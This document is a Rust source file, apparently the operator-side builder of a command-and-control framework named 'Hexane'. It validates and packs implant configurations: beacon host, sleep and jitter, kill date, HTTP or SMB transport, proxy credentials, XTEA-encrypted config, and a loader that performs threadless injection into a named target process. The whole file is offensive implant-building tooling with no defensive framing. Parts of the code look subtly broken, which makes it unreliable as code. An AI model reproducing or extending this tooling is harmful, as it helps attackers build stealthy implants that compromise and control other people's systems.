mod utils;
mod types;
mod error;
mod session;
mod cipher;
mod stream;

use std::fs;
use serde_json;
use serde::Deserialize;
use lazy_static::lazy_static;

use rand::Rng;
use std::io::{self, Write};
use core::fmt::Display;
use std::str::FromStr;
use std::sync::Mutex;

use crate::return_error;
use self::stream::Stream;
use self::cipher::{crypt_create_key, crypt_xtea};
use self::error::{Error, Result};
use self::session::{init, USERAGENT, CURDIR};
use self::types::{Hexane, JsonData, Compiler, UserSession, InjectionOptions, NetworkOptions};
use self::utils::{cursor, wrap_message, stop_print_channel};

lazy_static!(
    static ref INSTANCES: Mutex<Vec<Hexane>> = Mutex::new(vec![]);
);

pub fn run_client() {
    init();

    loop {
        cursor();

        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();

        let input = input.trim();
        if input.is_empty() {
            continue;
        }

        let args: Vec<String> = input.split_whitespace().map(str::to_string).collect();
        match args[0].as_str() {

            "load" => {
                load_instance(args).unwrap_or_else(|e| wrap_message("error", e.to_string()))
            },

            "exit" => break,
            _ => {
                wrap_message("error", format!("invalid input: {}", args[0]));
                continue;
            }
        }
    }

    stop_print_channel();
}

fn load_instance(args: Vec<String>) -> Result<()> {

    if args.len() != 2 {
        wrap_message("error", format!("invalid input: {} arguments", args.len()))
    }
    let mut instance = match map_json_config(&args[1]) {
        Ok(instance)    => instance,
        Err(e)          =>  return Err(e),
    };

    check_instance(&mut instance)?;
    setup_instance(&mut instance)?;
    setup_server(&mut instance)?;

    let build_dir   = instance.compiler.build_directory.as_str();
    let name        = instance.builder.output_name.as_str();
    let ext         = instance.compiler.file_extension.as_str();

    wrap_message("info", format!("{}/{}.{} is ready", build_dir, name, ext));
    INSTANCES.lock().unwrap().push(instance);

    Ok(())
}

fn setup_instance(instance: &mut Hexane) -> Result<()> {
    if instance.main.debug {
        instance.compiler.compiler_flags = String::from("\
            -std=c++23 \
            -g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel \
            -fno-ident -fpack-struct=8 -falign-functions=1 \
            -ffunction-sections -fdata-sections -falign-jumps=1 -w \
            -falign-labels=1 -fPIC -fno-builtin \
            -Wl,--no-seh,--enable-stdcall-fixup,--gc-sections");
    } else {
        instance.compiler.compiler_flags = String::from("\
            -std=c++23 \
            -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel \
            -fno-ident -fpack-struct=8 -falign-functions=1 \
            -ffunction-sections -fdata-sections -falign-jumps=1 -w \
            -falign-labels=1 -fPIC  -fno-builtin \
            -Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections");
    }

    let mut rng = rand::thread_rng();

    instance.peer_id = rng.random::<u32>();
    Ok(())
}

impl Hexane {
    pub fn generate_config_bytes(&mut self) -> Result<()> {
        self.crypt_key = crypt_create_key(16);

        let mut patch = self.create_binary_patch()?;
        if self.main.encrypt {
            let patch_cpy = patch.clone();
            patch = crypt_xtea(&patch_cpy, &self.crypt_key, true)?;
        }

        self.config_data = patch;
        Ok(())
    }

    pub fn create_binary_patch(&self) -> Result<Vec<u8>> {
        let mut stream = Stream::new();

        match self.network_type {
            1 => stream.pack_byte(1),
            0 => stream.pack_byte(0),
            _ => return return_error!("{}","Invalid transport type".into()),
        }

        stream.pack_bytes(&self.crypt_key);
        stream.pack_string(&self.main.hostname);

        for module in &self.builder.loaded_modules {
            stream.pack_string(module);
        }

        let working_hours = if let Some(ref hours) = self.main.working_hours {
            i32::from_str(hours)?
        } else {
            0
        };

        let kill_date = if let Some(ref date) = self.main.killdate {
            i64::from_str(date)?
        } else {
            0
        };

        stream.pack_dword(self.peer_id);
        stream.pack_dword(self.main.sleeptime);
        stream.pack_dword(self.main.jitter);
        stream.pack_int32(working_hours);
        stream.pack_dword64(kill_date);

        match &self.network.options {
            NetworkOptions::Http(mut http) => {
                stream.pack_wstring(&http.useragent.unwrap().as_str());
                stream.pack_wstring(&http.address);
                stream.pack_dword(http.port as u32);
                stream.pack_dword(http.endpoints.len() as u32);

                for endpoint in &http.endpoints {
                    stream.pack_wstring(endpoint);
                }

                stream.pack_string(&http.domain.unwrap().as_str());

                if let Some(mut proxy) = &http.proxy {
                    let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);
                    stream.pack_dword(1);
                    stream.pack_wstring(&proxy_url);
                    stream.pack_wstring(&proxy.username.unwrap().as_str());
                    stream.pack_wstring(&proxy.password.unwrap().as_str());
                } else {
                    stream.pack_dword(0);
                }
            }
            NetworkOptions::Smb(mut smb) => {
                stream.pack_wstring(&smb.egress_pipe.unwrap().as_str());
            }
        }

        Ok(stream.buffer)
    }
}



fn check_instance(instance: &mut Hexane) -> Result<()> {
    // check config
    {
        if instance.main.hostname.is_empty()                        { return_error!("a valid hostname must be provided") }
        if instance.main.architecture.is_empty()                    { return_error!("a valid architecture must be provided") }
        if instance.main.jitter < 0 || instance.main.jitter > 100   { return_error!("jitter cannot be less than 0% or greater than 100%") }
        if instance.main.sleeptime < 0                              { return_error!("sleeptime cannot be less than zero. wtf are you doing?") }
    }

    // check builder
    {
        if instance.builder.output_name.is_empty()      { return_error!("a name for the build must be provided") }
        if instance.builder.root_directory.is_empty()   { return_error!("a root directory for implant files must be provided") }

        if let Some(linker_script) = &instance.builder.linker_script {
            if linker_script.is_empty() { return_error!("linker_script field found but linker script path must be provided") }
        }

        if let Some(modules) = &instance.builder.loaded_modules {
            if modules.is_empty() { return_error!("loaded_modules field found but module names must be provided") }
        }

        if let Some(deps) = &instance.builder.dependencies {
            if deps.is_empty() { return_error!("builder dependencies field found but dependencies must be provided") }
        }

        if let Some(inc) = &instance.builder.include_directories {
            if inc.is_empty() { return_error!("builder include_directories field found but include directories must be provided") }
        }
    }

    // check network
    match &mut instance.network.options {
        NetworkOptions::Http(http) => {

            if http.address.is_empty()              { return_error!("a valid return url must be provided") }
            if http.port < 0 || http.port > 65535   { return_error!("http port must be between 0-65535") }
            if http.endpoints.is_empty()            { return_error!("at least one valid endpoint must be provided") }
            if http.useragent.is_none()             { http.useragent = Some(USERAGENT.to_string()); }

            if let Some(headers) = &http.headers {
                if headers.is_empty() { return_error!("http header field found but names must be provided") }
            }

            if let Some(domain) = &http.domain {
                if domain.is_empty() { return_error!("domain name field found but domain name must be provided") }
            }

            if let Some(proxy) = &http.proxy {
                if proxy.address.is_empty()             { return_error!("proxy field detected but proxy address must be provided") }
                if proxy.port < 0 || proxy.port > 65535 { return_error!("proxy field detected but proxy port must be between 0-65535") }

                if let Some(username) = &proxy.username {
                    if username.is_empty() { return_error!("proxy username field detected but the username was not provided") }
                }

                if let Some(password) = &proxy.password {
                    if password.is_empty() { return_error!("proxy password field detected but the password was not provided") }
                }

                if let Some(proto) = &proxy.proto {
                    if proto.is_empty() { return_error!("proxy protocol must be provided") }
                }
            }
        },

        NetworkOptions::Smb(smb) => {
            if smb.egress_peer.is_empty() { return_error!("an implant type of smb must provide the name of it's parent node") }
        }
    }

    // check loader
    if let Some(loader) = &mut instance.loader {
        if loader.root_directory.is_empty() { return_error!("loader field detected but root directory must be provided")}
        if loader.sources.is_empty()        { return_error!("loader field detected but sources must be provided")}
        if loader.rsrc_script.is_empty()    { return_error!("loader field detected but rsrc script must be provided")}

        if let Some(linker) = &loader.linker_script {
            if linker.is_empty() { return_error!("loader ld field detected but linker script must be provided")}
        }

        match &mut loader.injection {
            InjectionOptions::Threadless(threadless) => {
                if threadless.execute_object.is_empty()     { return_error!("loader field detected 'threadless injection' but an execute_object must be provided")}
                if threadless.loader_assembly.is_empty()    { return_error!("loader field detected 'threadless injection' but a loader assembly must be provided")}
                if threadless.target_process.is_empty()     { return_error!("loader field detected 'threadless injection' but a target process must be provided")}
                if threadless.target_module.is_empty()      { return_error!("laoder field detected 'threadless injection' but a target module must be provided")}
                if threadless.target_function.is_empty()    { return_error!("laoder field detected 'threadless injection' but a target function must be provided")}
            },
            InjectionOptions::Threadpool(_) => {
                return_error!("threadpool injection not yet supported")
            }
        }
    }

    Ok(())
}

fn setup_server(instance: &Hexane) -> Result<()> {
    Ok(())
}

fn map_json_config(file_path: &String) -> Result<Hexane> {

    let json_file = CURDIR.join("json").join(file_path);
    let contents = fs::read_to_string(json_file).map_err(Error::Io)?;

    let json_data = match serde_json::from_str::<JsonData>(contents.as_str()) {
        Ok(data)    => data,
        Err(e)      => {
            wrap_message("debug", format!("{}", contents));
            return Err(Error::SerdeJson(e))
        }
    };

    let group_id = 0;
    let instance = Hexane {

        current_taskid: 0, peer_id: 0, group_id, build_type: 0, network_type: 0,
        crypt_key: vec![], shellcode: vec![], config_data: vec![],
        active: false,

        compiler: Compiler {
            file_extension:     String::from(""),
            build_directory:    String::from(""),
            compiler_flags:     String::from(""),
        },

        main:       json_data.config,
        network:    json_data.network,
        builder:    json_data.builder,
        loader:     json_data.loader,

        user_session: UserSession {
            username: String::from(""),
            is_admin: false,
        },
    };

    Ok(instance)
}


